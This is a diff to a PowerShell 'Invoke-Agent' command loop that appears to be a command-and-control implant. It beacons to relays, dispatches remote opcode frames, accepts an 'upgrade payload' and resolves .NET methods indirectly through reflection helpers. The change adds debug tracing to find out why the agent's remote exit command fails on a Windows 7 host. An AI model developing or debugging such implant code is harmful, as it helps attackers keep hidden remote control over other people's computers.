@@ -271,7 +271,11 @@ function Invoke-Agent {
         $corrId = 0
         if ($frame.Length -ge 5) { $corrId = CallStatic (ResolveM 'System.BitConverter') 'ToUInt32' @([byte[]]$frame, 1) }
         Dbg ('[cmd] 0x{0:x}' -f $frame[0]) ('corrId ' + $corrId) #dbg
-        if ($frame[0] -eq 10) { $script:exiting = $true; return $null }
+        if ($frame[0] -eq 10) {
+            Dbg '[0x0A] flag set' $corrId #dbg
+            $script:exiting = $true
+            return $null
+        }
         if ($frame[0] -eq 11) {
             try {
                 # The upgrade payload is latin-1 text after the opcode (the JScript agent's
@@ -373,7 +377,7 @@ function Invoke-Agent {
     # Debug flavor: first-beacon-cycle popups only (the csharp-agent "healthy idle
     # iterations stay silent" rule — one [6]/[7] pair, never one per loop).
     $script:firstPost = $true #dbg
-    Dbg '[1] start' ('pid ' + $PID) #dbg
+    Dbg '[1] start' ('pid ' + $PID + ' ps ' + $PSVersionTable.PSVersion + ' clr ' + $PSVersionTable.CLRVersion) #dbg
     # Shared encoders, resolved once: UTF-8 for log frames, latin-1 in the upgrade arm.
     $utf8 = CallStatic (ResolveM 'System.Text.Encoding') 'GetEncoding' @(65001)
     # TLS 1.2 by int-cast (relays sit on modern TLS stacks; on .NET 3.5 the Tls12 enum
@@ -440,13 +444,28 @@ function Invoke-Agent {
             continue
         }
         $script:idleLogged = $false
+        # Win7 field trace (2026-09-23): the 0x0A Exit command was observed dead on the PS
+        # 2.0 box while the beacon stayed healthy. These four stage boxes make ONE field run
+        # pinpoint the failing stage: no [ans] = the agent never saw a non-empty answer
+        # (relay-side); [ans] + no [frames] = ParseFrames died; [frames] + no [cmd] = the
+        # DispatchCommand binding threw (the catch pops instead of dying); [cmd] + no exit =
+        # the flag/return unwinding. All #dbg — the release flavor is byte-identical behavior.
+        Dbg '[ans] bytes' $answer.Length #dbg
+        Dbg '[ans] head' ((($answer[0..([Math]::Min(7, $answer.Length - 1))]) | ForEach-Object { $_.ToString('x2') }) -join ' ') #dbg
         $frames = ParseFrames $answer
-        foreach ($f in $frames) {
-            if ($script:exiting) { break }
-            $replyBytes = DispatchCommand $f
-            if ($script:exiting) { Log 'exit'; return 'exit' }
-            if ($null -ne $replyBytes) { $pending += ,$replyBytes }
-        }
+        Dbg '[frames] n' (@($frames).Count) #dbg
+        try { #dbg
+            foreach ($f in $frames) {
+                if ($script:exiting) { break }
+                $replyBytes = DispatchCommand $f
+                if ($script:exiting) {
+                    Dbg '[0x0A] unwinding' '' #dbg
+                    Log 'exit'
+                    return 'exit'
+                }
+                if ($null -ne $replyBytes) { $pending += ,$replyBytes }
+            }
+        } catch { Dbg '[loop] threw' $_.Exception.Message; Log ('loop threw: ' + $_.Exception.Message); return 'fail' } #dbg
     }
     return 'exit'
 }
